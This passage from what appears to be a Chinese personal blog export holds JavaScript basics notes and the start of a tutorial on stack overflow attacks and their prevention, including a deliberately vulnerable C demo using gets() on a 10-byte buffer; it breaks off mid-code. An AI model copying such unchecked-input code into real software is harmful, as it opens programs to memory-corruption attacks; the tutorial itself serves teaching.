function_">alert</span>( <span class="title class_">Infinity</span> ); <span class="comment">// Infinity</span></span><br></pre></td></tr></table></figure><ul><li><code>NaN</code> 代表一个计算错误。它是一个不正确的或者一个未定义的数学操作所得到的结果。</li><li>NaN是<code>粘性</code>的。任何对 NaN`的进一步数学运算都会返回 NaN。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>( <span class="title class_">NaN</span> + <span class="number">1</span> ); <span class="comment">// NaN</span></span><br><span class="line"><span class="title function_">alert</span>( <span class="number">3</span> * <span class="title class_">NaN</span> ); <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure><h5 id="BigInt类型"><a href="#BigInt类型" class="headerlink" title="BigInt类型"></a>BigInt类型</h5><p><code>BigInt</code> 类型是最近被添加到 JavaScript 语言中的，用于表示任意长度的整数。我们只需要 将<code>n</code> 附加到整数字段的末尾来创建<code>BigInt</code>类型</p><p>在 JavaScript 中，“number” 类型无法安全地表示大于 ( $2^{53}$ -1)或小于$(2^{53}-1)$的整数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> bigInt = <span class="number">1234567890123456789012345678901234567890n</span>;</span><br><span class="line"><span class="title function_">alert</span>(bigInt); </span><br></pre></td></tr></table></figure><blockquote><p>我：为什么是<code>2^53 - 1</code>呢？</p><p>GLM4：这是因为在这个范围内的整数可以在64位浮点表示中精确地表示。IEEE 754双精度浮点数格式将64位分为三个部分：</p><ol><li>符号位（sign）：1位</li><li>指数（exponent）：11位</li><li>尾数（fraction/mantissa）：52位</li></ol><p>对于整数，尾数部分直接表示数字的值，而指数部分用于放大或缩小这个值。在JavaScript中，当指数为0时，尾数的52位可以直接表示一个整数。这52位可以表示的最大整数是<code>2^53 - 1</code>，因为第一位总是隐含的1，不在尾数中直接表示。</p></blockquote><h5 id="string类型"><a href="#string类型" class="headerlink" title="string类型"></a>string类型</h5><p>在 JavaScript 中，有三种包含字符串的方式。</p><ol><li>双引号：<code>&quot;Hello&quot;</code>。</li><li>单引号：<code>&#39;Hello&#39;</code>。</li><li>反引号：<code>`Hello` </code>,有点像格式化字符串</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">Username</span> = <span class="string">&quot;Randolfluo&quot;</span>;</span><br><span class="line"><span class="comment">// 嵌入一个变量</span></span><br><span class="line"><span class="title function_">alert</span>( <span class="string">`Hello, <span class="subst">$&#123;Username&#125;</span>!`</span> ); <span class="comment">// Hello, John!</span></span><br><span class="line"><span class="comment">// 嵌入一个表达式</span></span><br><span class="line"><span class="title function_">alert</span>( <span class="string">`the result is <span class="subst">$&#123;<span class="number">1</span> + <span class="number">2</span>&#125;</span>`</span> ); <span class="comment">// the result is 3</span></span><br></pre></td></tr></table></figure><h5 id="others"><a href="#others" class="headerlink" title="others"></a>others</h5><ul><li><code>null</code> 用于未知的值 —— 只有一个 <code>null</code> 值的独立类型。</li><li><code>undefined</code> 用于未定义的值 —— 只有一个 <code>undefined</code> 值的独立类型。</li><li><code>symbol</code> 用于唯一的标识符。</li><li><code>object</code> 用于更复杂的数据结构。属于非原始数据类型。</li></ul><h4 id="2-6-交互：alert、prompt-和-confirm"><a href="#2-6-交互：alert、prompt-和-confirm" class="headerlink" title="2.6 交互：alert、prompt 和 confirm"></a>2.6 交互：alert、prompt 和 confirm</h4><h5 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h5><p>着用户不能与页面的其他部分进行交互，直到他们处理完窗口。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;Randolf luo 是大帅逼&quot;</span>); </span><br></pre></td></tr></table></figure><h5 id="prompt"><a href="#prompt" class="headerlink" title="prompt"></a>prompt</h5><p>用于提示用户输入一些文本,第二个参数表示默认值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> age = <span class="title function_">prompt</span>(<span class="string">&#x27;How old are you?&#x27;</span>, <span class="number">100</span>);</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">`You are <span class="subst">$&#123;age&#125;</span> years old!`</span>); <span class="comment">// You are 100 years old!</span></span><br></pre></td></tr></table></figure><h5 id="confirm"><a href="#confirm" class="headerlink" title="confirm"></a>confirm</h5><p>提供question和确定和取消两个按钮的模态窗口。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> res = <span class="title function_">confirm</span>(<span class="string">&quot;你是天才吗？&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(res);</span><br></pre></td></tr></table></figure><p>这些方法都是模态的：它们暂停脚本的执行，并且不允许用户与该页面的其余部分进行交互，直到窗口被解除。</p><h4 id="2-7-类型转换"><a href="#2-7-类型转换" class="headerlink" title="2.7 类型转换"></a>2.7 类型转换</h4><ul><li>这里主要是注意在<code>js</code>中字符串<code>&quot;0&quot;</code>和空格字符串<code>&quot; &quot;</code>的bool值为<code>true</code></li><li>当无法转换为数字时，将会转化为<code>NaN</code></li></ul><h4 id="2-8-基础运算符，数学运算"><a href="#2-8-基础运算符，数学运算" class="headerlink" title="2.8 基础运算符，数学运算"></a>2.8 基础运算符，数学运算</h4><p>注意一下加号，当数字字符串与数字相加时，会转化为字符串：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="number">1</span> + <span class="string">&#x27;2&#x27;</span>)  <span class="comment">//12</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;2&#x27;</span> + <span class="number">1</span>)      <span class="comment">//21</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="number">1</span> + <span class="string">&#x27;2&#x27;</span> + <span class="number">1</span>)      <span class="comment">//121</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="number">1</span> + <span class="number">1</span> + <span class="string">&#x27;2&#x27;</span>)      <span class="comment">//22</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>加号也能以更简短的方式转化非数字，效果和 <code>Number(...)</code> 相同，但是更加简短。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 转化非数字</span></span><br><span class="line"><span class="title function_">alert</span>( +<span class="literal">true</span> ); <span class="comment">// 1</span></span><br><span class="line"><span class="title function_">alert</span>( +<span class="string">&quot;&quot;</span> );   <span class="comment">// 0</span></span><br></pre></td></tr></table></figure><p>我们把上述功能加在一起</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="keyword">let</span> y = <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="title function_">alert</span>(x + y)<span class="comment">//33</span></span><br><span class="line"><span class="title function_">alert</span>(+x + +y)<span class="comment">//6</span></span><br></pre></td></tr></table></figure><h4 id="2-9-值的比较"><a href="#2-9-值的比较" class="headerlink" title="2.9 值的比较"></a>2.9 值的比较</h4><ul><li>严格相等运算符 <code>===</code> 在进行比较时不会做任何的类型转换。</li><li>在非严格相等 <code>==</code> 下，<code>null</code> 和 <code>undefined</code> 相等且各自不等于任何其他的值。</li><li>在使用 <code>&gt;</code> 或 <code>&lt;</code> 进行比较时，需要注意变量可能为 <code>null/undefined</code> 的情况。</li></ul><h4 id="2-10-条件分支：if-和-‘-’"><a href="#2-10-条件分支：if-和-‘-’" class="headerlink" title="2.10 条件分支：if 和 ‘?’"></a>2.10 条件分支：if 和 ‘?’</h4><ul><li>即<code>if...else...</code>语句和<code>? :</code>三目运算符。</li></ul><h4 id="2-11-逻辑运算符"><a href="#2-11-逻辑运算符" class="headerlink" title="2.11 逻辑运算符"></a>2.11 逻辑运算符</h4><p>对<code>||</code>进行了拓展——返回第一个真值。若都是假值，返回最后一个值。</p><p>对<code>&amp;&amp;</code>也进行了拓展——返回第一个假值。若都是真值，返回最后一个值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> firstName = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> lastName = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> nickName = <span class="string">&quot;SuperCoder&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>( firstName || lastName || nickName || <span class="string">&quot;Anonymous&quot;</span>);    <span class="comment">// SuperCoder</span></span><br><span class="line"><span class="title function_">alert</span>( firstName || lastName || <span class="string">&quot;Anonymous&quot;</span>);       <span class="comment">// Anonymous</span></span><br></pre></td></tr></table></figure><h5 id="2-12-空值合并运算符-‘-’"><a href="#2-12-空值合并运算符-‘-’" class="headerlink" title="2.12 空值合并运算符 ‘??’"></a>2.12 空值合并运算符 ‘??’</h5><p>a ?? b 的结果是：</p><ul><li><p>如果 a 是已定义的，则结果为 a，</p></li><li><p>如果 a 不是已定义的，则结果为 b。</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">Username</span>;</span><br><span class="line"><span class="comment">//在某处赋值</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(<span class="string">`当前用户为<span class="subst">$&#123;(Username?? <span class="string">&quot;游客&quot;</span> )&#125;</span>`</span>);</span><br></pre></td></tr></table></figure><h4 id="2-13-循环"><a href="#2-13-循环" class="headerlink" title="2.13 循环"></a>2.13 循环</h4><ul><li>这里注意下类似goto语句的标签：<code>break outer</code> <strong>向上</strong>寻找名为 <code>outer</code> 的标签并跳出当前循环。</li><li>主要用于退出多重循环(ps：我试了下一重循环会报错)</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">outer</span>:</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;In outer loop&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;In inner loop&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span> outer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;OK&quot;</span>);</span><br></pre></td></tr></table></figure><p>当跳转到outer标签时，会忽略下一循环。因此这里每个<code>alert语句</code>只被执行一次。</p><h4 id="2-14-“switch”-语句"><a href="#2-14-“switch”-语句" class="headerlink" title="2.14 “switch” 语句"></a>2.14 “switch” 语句</h4><ul><li>只需注意下被比较的值必须是相同的类型才能进行匹配。</li></ul><h4 id="2-15-函数"><a href="#2-15-函数" class="headerlink" title="2.15 函数"></a>2.15 函数</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">fun</span>(<span class="params">arg1, arg2 = <span class="string">&quot;Defalut&quot;</span>, arg3</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_">alert</span>(arg1);    <span class="comment">//undefined</span></span><br><span class="line">    <span class="title function_">alert</span>(arg2);    <span class="comment">//Defalut</span></span><br><span class="line">    <span class="title function_">alert</span>(arg3);    <span class="comment">//3</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(<span class="string">`返回值为：<span class="subst">$&#123;fun(<span class="literal">undefined</span>, <span class="literal">undefined</span>, <span class="number">3</span>)&#125;</span>`</span>);     <span class="comment">//返回值为：undefined</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-16-函数表达式"><a href="#2-16-函数表达式" class="headerlink" title="2.16 函数表达式"></a>2.16 函数表达式</h4><p><strong>函数是值。它们可以在代码的任何地方被分配，复制或声明。</strong></p><h5 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h5><p>函数声明在其被声明的代码块内的任何位置都是可见的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">declaration</span>();<span class="comment">//因此我们可以在声明前调用函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">declaration</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;Declaration&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们<code>优先</code>使用函数声明式。</p><h5 id="函数表达式"><a href="#函数表达式" class="headerlink" title="函数表达式"></a>函数表达式</h5><p>函数表达式在代码执行到它时才会被创建。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">expression</span>()<span class="comment">//error</span></span><br><span class="line"><span class="keyword">let</span> expression = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;Expression&quot;</span>);</span><br><span class="line">&#125;;      <span class="comment">//注意加入分号,它不是函数语法的一部分。</span></span><br></pre></td></tr></table></figure><p>当函数调用者所在作用域大于函数声明式所在作用域时，函数声明式将不可见。我们可以使用函数表达式代替。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> age = <span class="title function_">prompt</span>(<span class="string">&quot;What is your age?&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> welcome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (age &lt; <span class="number">18</span>) &#123;</span><br><span class="line"></span><br><span class="line">  welcome = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">  welcome = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;Greetings!&quot;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">welcome</span>(); <span class="comment">// 现在可以了</span></span><br></pre></td></tr></table></figure><h5 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ASK</span>(<span class="params">A,B</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">confirm</span>(<span class="string">&quot;你喜欢A吗&quot;</span>))</span><br><span class="line">        <span class="title function_">A</span>();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="title function_">B</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">A</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;I love A&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">B</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;I don&#x27;t love A&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">ASK</span>(A,B);</span><br></pre></td></tr></table></figure><h4 id="2-17-箭头函数，基础知识"><a href="#2-17-箭头函数，基础知识" class="headerlink" title="2.17 箭头函数，基础知识"></a>2.17 箭头函数，基础知识</h4><p>即返回值后置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> age = <span class="title function_">prompt</span>(<span class="string">&quot;What is your age?&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> welcome = (age &lt; <span class="number">18</span>) ?</span><br><span class="line">  <span class="function">() =&gt;</span> <span class="title function_">alert</span>(<span class="string">&#x27;Hello!&#x27;</span>) :</span><br><span class="line">  <span class="function">() =&gt;</span> <span class="title function_">alert</span>(<span class="string">&quot;Greetings!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">welcome</span>();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出攻击原理与防范</title>
      <link href="/2024/05/24/others/%E7%BD%91%E5%AE%89%E8%AF%BE%E8%AE%BE/"/>
      <url>/2024/05/24/others/%E7%BD%91%E5%AE%89%E8%AF%BE%E8%AE%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="栈溢出攻击原理与防范"><a href="#栈溢出攻击原理与防范" class="headerlink" title="栈溢出攻击原理与防范"></a>栈溢出攻击原理与防范</h1><p><code>栈溢出（又名stack overflow）</code>，指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。</p><p>[toc]</p><h3 id="为什么栈溢出如此知名"><a href="#为什么栈溢出如此知名" class="headerlink" title="为什么栈溢出如此知名"></a>为什么栈溢出如此知名</h3><ul><li><p><strong>莫里斯蠕虫</strong></p></li><li><p>莫里斯蠕虫病毒利用了栈溢出漏洞</p><p>莫里斯蠕虫（Morris Worm）是在1988年11月2日由<code>罗伯特·泰潘·莫里斯（Robert Tappan Morris）</code>编写的一个计算机蠕虫。导致数千台计算机瘫痪，造成了大量的时间和金钱损失。他也是第一个因计算机犯罪而被判<code>有罪</code>的人。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240523230602339.png" alt="博物馆存放的原件"></p></li><li><p><strong>stack overflow</strong> 论坛logo：全球知名的程序员论坛</p></li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/1715950280132.jpg" alt="stack overflow"></p><ul><li>漏洞发现至今已有35年，缓冲区溢出漏洞仍<code>占比</code>最多：</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/20240514170615.png" alt="天融信阿尔法实验室漏洞报告"></p><h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>什么是栈溢出，请看如下<code>demo</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">10</span>];</span><br><span class="line">    gets(s);     <span class="comment">//我们在c语言学习中用到的函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input：%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;      <span class="comment">//在posix标准中返回0代表程序正常终止</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc demo.c -m32 -o demo </span></span><br></pre></td></tr></table></figure><p>问问AI，他说<code>gets</code>已被标记为不安全的函数，那我们来看看他到底哪里不安全：</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240531212700596.png" alt="通义灵码"></p><p>这里使用<code>gcc demo.c -m32 -o demo</code>来编译32位的程序（PS：这里使用32位的原因是32位的应用程序的参数都是存入栈中，可以更好解释栈溢出）。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240531201930001.png" alt="./demo"></p><p>我们发现，当输入长度为<code>10</code>的字符串时，程序还能正常输出。但是当我们再添加<code>1位</code>，程序被操作系统终止。</p><ul><li>我们可以推测，这里程序被终止的原因是因为输入的长度大于字符数组的长度（即s字符串溢出函数运行时栈）。那么，为什么操作系统要终止发生溢出的程序呢？</li><li>你也许还想起，c语言字符串结尾是以<code>\0</code>结尾的，我们应该只能输入九个字符？</li><li>别急，我们细细道来~~</li></ul><h3 id="什么是函数调用栈"><a href="#什么是函数调用栈" class="headerlink" title="什么是函数调用栈"></a>什么是函数调用栈</h3><p>我们先来了解下函数调用栈：</p><p><code>函数调用栈（Call Stack）</code>是一种数据结构，用于管理程序中的函数调用。在调用函数时，计算机需要一种方式来跟踪函数的执行位置，以便函数执行完毕后能够返回到调用它的位置继续执行。函数调用栈就是用来实现这一目的的。</p><p>当函数被调用时，以下信息被压入栈中：</p><ol><li><strong>返回地址</strong>：调用函数后的下一条指令的地址。</li><li><strong>局部变量</strong>：被调用函数中声明的局部变量。</li><li><strong>传递参数</strong>：从调用函数传递给被调用函数的参数。</li><li><strong>保存的寄存器值</strong>：某些寄存器的值，因为在函数执行过程中可能会被修改，所以在进入函数时需要先保存起来，以便在函数返回时能够恢复。</li></ol><p>每次函数调用都会在栈上创建一个<strong>新的栈帧（Stack Frame）</strong>，用于存放上述信息。当函数执行完毕后，其栈帧会被弹出，程序会根据栈帧中保存的返回地址跳回到调用函数的下一条指令继续执行。</p><p>这个过程可以形象地比喻为栈的<strong>压栈（Push）和出栈（Pop）</strong>操作。每进入一个函数，就相当于在栈顶加了一个新的栈帧；每从一个函数返回，就相当于从栈顶移除了一个栈帧。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240517203828172.png" alt="csapp——函数调用栈"></p><p>我们先记住这两个事实：</p><ul><li><p>函数调用栈是反向增长的。</p></li><li><p>函数调用栈有局部变量、返回地址等重要数据。</p></li></ul><h3 id="理解函数指针"><a href="#理解函数指针" class="headerlink" title="理解函数指针"></a>理解函数指针</h3><h4 id="函数，其实是个地址？"><a href="#函数，其实是个地址？" class="headerlink" title="函数，其实是个地址？"></a>函数，其实是个地址？</h4><p>接下来我们看看C语言的函数指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个简单的函数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">sp</span><span class="params">(<span class="type">void</span>)</span>&#123; <span class="keyword">asm</span>(<span class="string">&quot;mov %rsp, %rax&quot;</span>);&#125;<span class="comment">//rax寄存器存储返回值，这里返回rsp的地址</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明一个函数指针，指向返回类型为int，参数为两个int的函数</span></span><br><span class="line">    <span class="type">int</span> (*func_ptr)(<span class="type">int</span>, <span class="type">int</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将函数add的地址赋给函数指针</span></span><br><span class="line">    func_ptr = add;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过函数指针调用函数</span></span><br><span class="line">    <span class="type">int</span> result = func_ptr(<span class="number">3</span>, <span class="number">4</span>);   <span class="comment">// 3+4 = 7</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;函数地址：%p\n&quot;</span>,func_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result: %d\n&quot;</span>, result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc functionpointer.c -o functionpointer</span></span><br></pre></td></tr></table></figure><p>运行一下，输出结果如下。可以看到：</p><ol><li>我们成功通过函数指针调用<code>add</code>函数。</li><li>函数地址在每次运行时都不一样。</li></ol><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240531211536060.png" alt="./functionpointer"></p><p>我们来看下该程序的汇编<strong>（橙色）</strong>，发现函数指针的赋值时通过<code>一条</code>汇编指令<code>mov     QWORD PTR [rbp-8], OFFSET FLAT:add(int, int)</code>来执行的，翻译一下这条汇编指令，即先找到<code>add(int, int)</code>函数标识符的地址，然后存储到基址指针 <code>rbp</code>（基址指针寄存器）减去 8 字节位置处的内存地址。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240531210557274.png" alt="compiler explorer"></p><ul><li>那么，<code>函数的实质</code>可以理解为<code>符号（标识符）</code>和<code>地址</code>的组合。编译器在编译过程中会将这个符号解析为一个内存地址，这个内存地址指向存储函数代码的地方。</li><li>PS：32位函数地址为四字节（<script type="math/tex">2^{32}</script>)，64位函数地址为八字节(<script type="math/tex">2^{64}</script>)。这是32位操作系统和64位操作系统的区别导致的——地址总线宽度不同而导致64位系统可访问的内存远大于32位系统。</li></ul><h4 id="让我们来实现递归吧"><a href="#让我们来实现递归吧" class="headerlink" title="让我们来实现递归吧"></a>让我们来实现递归吧</h4><p>接下来，我们利用这一点实现对<code>main</code>函数的递归调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 